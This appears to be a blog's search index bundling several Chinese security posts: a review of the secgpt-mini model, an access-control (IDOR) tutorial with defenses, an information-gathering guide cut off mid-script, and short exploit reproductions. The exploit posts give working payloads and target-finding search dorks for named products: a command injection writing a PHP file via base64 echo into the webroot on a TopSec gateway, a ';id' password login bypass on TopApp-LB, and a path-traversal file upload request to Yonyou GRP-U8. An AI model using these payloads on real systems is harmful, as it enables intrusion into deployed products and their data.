<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>针对secgpt-mini的网络安全大模型搭建以及使用</title>
    <link href="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1>    前言</h1><p>​随着人工智能技术的不断发展，它在网络安全领域中的作用也日益增加。AI可以帮助检测和识别潜在的安全威胁，提供智能的解决方案并提高安全性。然而，AI也可能导致安全漏洞，这些漏洞可能会被恶意利用或被攻击者利用来获取未授权的访问权限，从而可能导致严重后果。</p><p>​目前，许多企业正在使用AI来提升安全性，并开发了各种类型的漏洞。例如，AI算法可能会出现错误或绕过保护机制的情况，这可能导致未经授权的访问、数据泄露或甚至远程代码执行等严重问题。此外，由于AI系统是基于机器学习和大数据分析技术的，它们也可能存在数据隐私和安全问题。</p><p>​尽管AI可能带来一些安全风险，但是它可以弥补人类不足之处，并帮助我们更好地保护信息和系统免受攻击。因此，我们需要与AI合作，确保其安全可靠地使用和发布。</p><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p>搭个mini的过过瘾😘</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172410316.png" alt="image-20241020172410316"></p><h2 id="Docker一键运行"><a href="#Docker一键运行" class="headerlink" title="Docker一键运行"></a>Docker一键运行</h2><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> python:slim<br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /secgpt-mini</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . /secgpt-mini</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip install -i https://mirrors.ustc.edu.cn/pypi/web/simple -r requirements.txt</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">7860</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;python&quot;</span>, <span class="hljs-string">&quot;webdemo.py&quot;</span>, <span class="hljs-string">&quot;--base_model&quot;</span>, <span class="hljs-string">&quot;/secgpt-mini/models&quot;</span>]</span><br></code></pre></div></td></tr></table></figure><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><p>克隆所需文件，包括模型</p><p>git clone <a href="https://huggingface.co/clouditera/secgpt-mini">https://huggingface.co/clouditera/secgpt-mini</a></p><p><em>如果没有模型，如果有略过，手动下载后放到models目录中</em></p><p><em><a href="https://huggingface.co/clouditera/secgpt-mini/blob/main/models/model.safetensors">https://huggingface.co/clouditera/secgpt-mini/blob/main/models/model.safetensors</a></em></p><p>然后下载所需要模块</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install -i https:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/pypi/</span>web/simple -r requirements.txt<br></code></pre></div></td></tr></table></figure><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172115834.png" alt="image-20241020172115834"></p><p>下载完毕后使用命令</p><p>python .\webdemo.py –base_model .\models\ </p><p>运行，浏览器打开 <a href="http://127.0.0.1:7860/">http://127.0.0.1:7860/</a> 访问web页面</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172210661.png" alt="image-20241020172210661"></p><h1 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h1><blockquote><p>对于体验的话，每个人的感受都是不同的，我针对一些问题，分别提问，看看回答的咋样😁</p></blockquote><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>sqlmap：</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020172924615.png" alt="image-20241020172924615"></p><p>回答1有点抽风，回答2正常的使用参数也是能给出来的</p><p>问了一些sql注入过滤bypass的，发现，有点蠢啊这ai</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020174050013.png" alt="image-20241020174050013"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020183714687.png" alt="image-20241020183714687"></p><p>只测试了几个php的代码，发现对于代码的理解，有点呃 ，，，，</p><h2 id="简单面试题"><a href="#简单面试题" class="headerlink" title="简单面试题"></a>简单面试题</h2><p>只能说，纯显示而已了</p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020183828806.png" alt="image-20241020183828806"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020183940976.png" alt="image-20241020183940976"><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020184109992.png" alt="image-20241020184109992"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020173436414.png" alt="image-20241020173436414"></p><p><img src="/2024/10/19/%E9%92%88%E5%AF%B9secgpt-mini%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20241020184054324.png" alt="image-20241020184054324"></p><p>开头的前言也是这个模型生成的，只能说可以研究原理，真正使用的话，不推荐</p>]]></content>
    
    
    
    <tags>
      
      <tag>ai</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天融信-上网行为管理系统任意文件写入</title>
    <link href="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    <url>/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询"></a>资产查询</h1><p>测绘语句:app&#x3D;“天融信-上网行为管理系统”</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112008685.png" alt="image-20240618112008685"></p><h1 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h1><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112015416.png" alt="image-20240618112015416"></p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm"><span class="hljs-symbol">poc:</span><br>/view/IPV<span class="hljs-number">6</span>/naborTable/static_convert.php?blocks[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span>||<span class="hljs-variable">%20</span><br>echo<span class="hljs-variable">%20</span>PD<span class="hljs-number">9</span>waHAgcGhwaW<span class="hljs-number">5</span>mbygpOz<span class="hljs-number">8</span>+<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>Cbase<span class="hljs-number">64</span><span class="hljs-variable">%20</span>-<br>d<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%20</span>/var/www/html/<span class="hljs-number">1</span>.php<span class="hljs-variable">%0</span>a<br><br>拼接路径访问即可，它会把<span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>写到/var/www/html/<span class="hljs-number">1</span>.php中<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112033933.png" alt="image-20240618112033933"></p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/image-20240618112041237.png" alt="image-20240618112041237"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天融信 TopApp-LB 登陆绕过漏洞</title>
    <link href="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="资产测绘"><a href="#资产测绘" class="headerlink" title="资产测绘:"></a>资产测绘:</h1><p>title&#x3D;“TopApp-LB 负载均衡系统”</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111811434.png" alt="image-20240618111811434"></p><h1 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h1><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111820823.png" alt="image-20240618111820823"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h1><p>账号任意输，密码: ;id</p><p>比如: 账号:aaa 密码: ;id</p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111834320.png" alt="image-20240618111834320"></p><p><img src="/2024/06/18/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/image-20240618111841674.png" alt="image-20240618111841674"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用友GPR漏洞复现</title>
    <link href="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="测绘-hunter"><a href="#测绘-hunter" class="headerlink" title="测绘(hunter)"></a>测绘(hunter)</h1><p>app.name&#x3D;“用友GRP-U8 OA”</p><p><img src="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240618111534110.png" alt="image-20240618111534110"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=%2e%2e%2f&amp;filename=test.jsp&amp;filename=1.jpg</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>XXX.XXX.XXX:99<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------192386535332116664783811905534<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>263<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------192386535332116664783811905534</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;myFile&quot;; filename=&quot;1.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/x-php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;%<span class="hljs-keyword">out</span>.print(&quot;test vulnerability!&quot;);%&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">-----------------------------192386535332116664783811905534--</span></span><br></code></pre></div></td></tr></table></figure><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p><img src="/2024/06/18/%E7%94%A8%E5%8F%8BGPR%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240618111631898.png" alt="image-20240618111631898"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透-越权</title>
    <link href="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/"/>
    <url>/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="1、什么是越权？"><a href="#1、什么是越权？" class="headerlink" title="1、什么是越权？"></a>1、什么是越权？</h1><p>越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。</p><p>越权漏洞的成因主要是因为开发人员在对数据进行<strong>增、删、改、查询</strong>时对客户端请求的数据过分相信而遗漏了权限的判定。而且属于逻辑漏洞的一种，防护和检测都不好做。</p><h1 id="2、越权的分类："><a href="#2、越权的分类：" class="headerlink" title="2、越权的分类："></a>2、越权的分类：</h1><p><strong>1.水平越权</strong>：这种类型的越权就是越权其他用户，比如说你要查看一篇邮件，但是存在越权漏洞，却可以查看其他人的邮件。水平越权导致任意用户敏感信息泄露或者用户信息被恶意修改。</p><p><strong>2.垂直越权</strong>：这种类型的越权就是可以在<strong>不同身份之间越权</strong>，比如你是普通用户，但是可以越权到管理员，甚至超级管理员。这样就可以利用管理员或者超级管理员的功能。</p><p><strong>3.上下文越权</strong>：上下文越权就是说在某个程序需要执行n个步骤，而你却可以跳过其中某个步骤，直接到最后的步骤。</p><h1 id="3、在哪里容易发生越权？"><a href="#3、在哪里容易发生越权？" class="headerlink" title="3、在哪里容易发生越权？"></a>3、在哪里容易发生越权？</h1><p><strong>1.基础参数</strong>：通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 <strong>id</strong> 便可查看，当修改为他人的id号时会返回他人的信息。<strong>再比如cookie中的参数就作为用户的凭据，修改这个凭据便可以其他用户身份通过验证。</strong></p><p><strong>2.多阶段验证</strong>：多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，<strong>很多程序会在这一步不再验证用户身份</strong>，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p><p><strong>3.基于参数的访问控制</strong>：有的程序会在参数里面进行权限认证。如：<a href="http://www.aaaa.com/name=test&admin=0">www.aaaa.com/name=test&amp;admin=0</a> ，把0改为1就有了admin权限。</p><p><strong>4.链接隐藏</strong>：有的程序会把页面独立，让爬虫爬取不到，但是可以使用扫目录的方式扫到url，如果此时页面不做权限认证，就可直接访问到功能点，或者只是前端跳转，<strong>可以使用burp抓回包，然后删除js代码绕过。</strong></p><p><strong>5.越权可能存在的地方</strong>：<strong>增、删、改、查、详情、导出</strong>等功能，当有这些功能的时候提高重视，在url、post data、cookie处寻找是否有鉴权参数最关键的点就是定位鉴权参数，<strong>然后替换为其他账户鉴权参数的方法来发现越权漏洞。</strong></p><h1 id="4、如何挖掘越权漏洞："><a href="#4、如何挖掘越权漏洞：" class="headerlink" title="4、如何挖掘越权漏洞："></a>4、如何挖掘越权漏洞：</h1><p>测试水平越权漏洞一般要<strong>控制2个账号</strong>，来互相探测能否影响到对方数据，一般是使用2个浏览器，分别使用2个账号登陆，<strong>在各个功能点修改参数（get、post、cookie）观察是否会影响到另一个账号的数据。</strong> 测试垂直越权一般看是否补通过认证即可访问管理页面，或是找是否有一个参数表示身份权限是否是管理员。</p><h1 id="5、实例"><a href="#5、实例" class="headerlink" title="5、实例"></a>5、实例</h1><p>（注：实例中的目标站点漏洞修复或站点已经关闭）</p><h2 id="xx师范学院校园资讯平台存在越权漏洞："><a href="#xx师范学院校园资讯平台存在越权漏洞：" class="headerlink" title="xx师范学院校园资讯平台存在越权漏洞："></a>xx师范学院校园资讯平台存在越权漏洞：</h2><p>URL：<a href="https://175.24.xx.xx/login/">https://175.24.xx.xx/login/</a></p><p>这里注册一个账号，然后登陆</p><p>15xxxx12&#x2F;test123</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110407431.png" alt="image-20240618110407431"></p><p>登录进来后点击上方的个人信息，进入个人信息页面，查看http包，发现，cookie中存在id参数，并且参数等于某个数值</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110444508.png" alt="image-20240618110444508"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110602425.png" alt="image-20240618110602425"></p><p>尝试使用其他人的id，这里，点进其中一个人主页，URL中存在用户的id</p><p>抓包，然后将cookie的id改成51</p><p>成功越权访问他人主页</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110541980.png" alt="image-20240618110541980"></p><p>越权成功</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110618776.png" alt="image-20240618110618776"></p><p>评论，也是更改其他用户id，发送，使用他人身份发送成功</p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110638016.png" alt="image-20240618110638016"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110651476.png" alt="image-20240618110651476"></p><p><img src="/2024/06/18/%E6%B8%97%E9%80%8F-%E8%B6%8A%E6%9D%83/image-20240618110658451.png" alt="image-20240618110658451"></p><h1 id="6、越权的防护："><a href="#6、越权的防护：" class="headerlink" title="6、越权的防护："></a>6、越权的防护：</h1><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.不能只根据用户 id 参数去搜索，应该再次进行身份验证（防止水平越权）。<br><span class="hljs-number">2</span>.可以从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 <span class="hljs-keyword">user</span> <span class="hljs-title">信息。</span><br><span class="hljs-title">3</span>.在每个页面加载前进行权限认证（防止垂直越权）。<br><span class="hljs-number">4</span>.对有多步验证的应用，需要准确验证上一步是否通过。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>越权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透-信息收集（三）</title>
    <link href="/2024/06/18/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2024/06/18/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集其他"><a href="#信息收集其他" class="headerlink" title="信息收集其他"></a>信息收集其他</h1><h2 id="旁站和C段"><a href="#旁站和C段" class="headerlink" title="旁站和C段"></a>旁站和C段</h2><p>旁站往往存在业务功能站点，建议先收集已有IP的旁站，再探测C段，确认C段目标后，再在C段的基础上再收集一次旁站。</p><p>旁站是和已知目标站点在同一服务器但不同端口的站点，通过以下方法搜索到旁站后，先访问一下确定是不是自己需要的站点信息。</p><p><strong>站长之家</strong><br>同ip网站查询<a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p><p><a href="https://chapangzhan.com/">https://chapangzhan.com/</a></p><p><strong>google hacking</strong><br><a href="https://blog.csdn.net/qq_36119192/article/details/84029809">https://blog.csdn.net/qq_36119192/article/details/84029809</a></p><p><strong>网络空间搜索引擎</strong></p><p>如FOFA搜索旁站和C段</p><p>该方法效率较高，并能够直观地看到站点标题，但也有不常见端口未收录的情况，虽然这种情况很少，但之后补充资产的时候可以用下面的方法nmap扫描再收集一遍。</p><p><strong>在线c段 webscan.cc</strong><br>webscan.cc</p><p><a href="https://c.webscan.cc/">https://c.webscan.cc/</a></p><p><strong>c段利用脚本</strong></p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">pip install requests<br><br><span class="hljs-selector-id">#coding</span>:utf-<span class="hljs-number">8</span><br><br>import requests<br><br>import json<br><br>def <span class="hljs-built_in">get_c</span>(ip):<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在收集&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ip))<br><br>url=<span class="hljs-string">&quot;http://api.webscan.cc/?action=query&amp;ip=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ip)<br><br>req=requests.<span class="hljs-built_in">get</span>(url=url)<br><br>html=req.text<br><br>data=req.<span class="hljs-built_in">json</span>()<br><br>if <span class="hljs-string">&#x27;null&#x27;</span> not in html:<br><br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;resulit.txt&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:<br><br>f.<span class="hljs-built_in">write</span>(ip + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.<span 